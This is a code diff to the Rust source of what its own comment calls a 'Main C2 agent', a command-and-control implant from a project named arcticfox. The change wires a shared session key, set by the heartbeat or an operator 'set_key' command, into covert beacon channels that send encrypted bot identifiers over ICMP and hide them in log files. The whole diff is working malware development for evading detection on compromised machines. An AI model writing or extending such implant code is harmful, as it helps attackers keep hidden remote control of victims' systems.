@@ -22,6 +22,8 @@ use crate::heartbeat::Heartbeat;
 use crate::icmp_heartbeat;
 use crate::log_covert;
 
+use arcticfox_core::crypto::SESSION_KEY_LEN;
+
 const MAX_REPOS: usize = 256;
 
 /// Main C2 agent.
@@ -33,6 +35,8 @@ pub struct Agent {
     bot_hasher: BotHasher,
     marker_sets: RwLock<Vec<SessionMarkers>>,
     cmd_rx: RwLock<Option<mpsc::UnboundedReceiver<String>>>,
+    /// Shared session key — set by heartbeat, used by ICMP/log_covert
+    shared_key: Arc<RwLock<Option<[u8; SESSION_KEY_LEN]>>>,
 }
 
 impl Agent {
@@ -64,6 +68,7 @@ impl Agent {
             bot_hasher,
             marker_sets: RwLock::new(vec![SessionMarkers::default()]),
             cmd_rx: RwLock::new(Some(cmd_rx)),
+            shared_key: Arc::new(RwLock::new(None)),
         })
     }
 
@@ -124,11 +129,13 @@ impl Agent {
         let dest_ip: std::net::Ipv4Addr = self.config.read().await.icmp_heartbeat_dest
             .parse().unwrap_or(std::net::Ipv4Addr::new(8, 8, 8, 8));
         let icmp_interval = self.config.read().await.icmp_heartbeat_interval;
+        let shared_key_icmp = self.shared_key.clone();
         let mut shutdown_icmp = shutdown.clone();
         tokio::spawn(async move {
-            let key = arcticfox_core::crypto::generate_session_key();
+            let default_key = arcticfox_core::crypto::generate_session_key();
             let mut seq: u16 = 0;
             loop {
+                let key = shared_key_icmp.read().await.unwrap_or(default_key);
                 tokio::select! {
                     _ = tokio::time::sleep(std::time::Duration::from_secs(icmp_interval)) => {
                         icmp_heartbeat::send_icmp_heartbeat(&bot_id_icmp, &key, dest_ip, 0xAF47, seq);
@@ -145,10 +152,12 @@ impl Agent {
         let bot_id_log = self.bot_id.clone();
         let log_path = self.config.read().await.log_covert_path.clone();
         let log_interval = self.config.read().await.log_covert_interval;
+        let shared_key_log = self.shared_key.clone();
         let mut shutdown_log = shutdown.clone();
         tokio::spawn(async move {
-            let key = arcticfox_core::crypto::generate_session_key();
+            let default_key = arcticfox_core::crypto::generate_session_key();
             loop {
+                let key = shared_key_log.read().await.unwrap_or(default_key);
                 tokio::select! {
                     _ = tokio::time::sleep(std::time::Duration::from_secs(log_interval)) => {
                         log_covert::write_log_covert(&log_path, bot_id_log.as_bytes(), &key);
@@ -349,8 +358,9 @@ impl Agent {
                 if let Ok(key_bytes) = hex::decode(key_hex) {
                     if key_bytes.len() == 32 {
                         let mut key = [0u8; 32];
-                        key.copy_from_slice(&key_bytes);
-                        self.heartbeat.update_session_key(key).await;
+                    key.copy_from_slice(&key_bytes);
+                    self.heartbeat.update_session_key(key).await;
+                    *self.shared_key.write().await = Some(key);
                         // Register new markers derived from this key
                         let new_markers = SessionMarkers::from_key(&key);
                         let mut markers = self.marker_sets.write().await;
@@ -464,8 +474,9 @@ impl Agent {
                 if let Ok(key_bytes) = hex::decode(cmd.strip_prefix("set_key ").unwrap_or("").trim()) {
                     if key_bytes.len() == 32 {
                         let mut key = [0u8; 32];
-                        key.copy_from_slice(&key_bytes);
-                        self.heartbeat.update_session_key(key).await;
+                    key.copy_from_slice(&key_bytes);
+                    self.heartbeat.update_session_key(key).await;
+                    *self.shared_key.write().await = Some(key);
                         let mut markers = self.marker_sets.write().await;
                         let new_markers = SessionMarkers::from_key(&key);
                         if !markers.iter().any(|m| m.start == new_markers.start) {
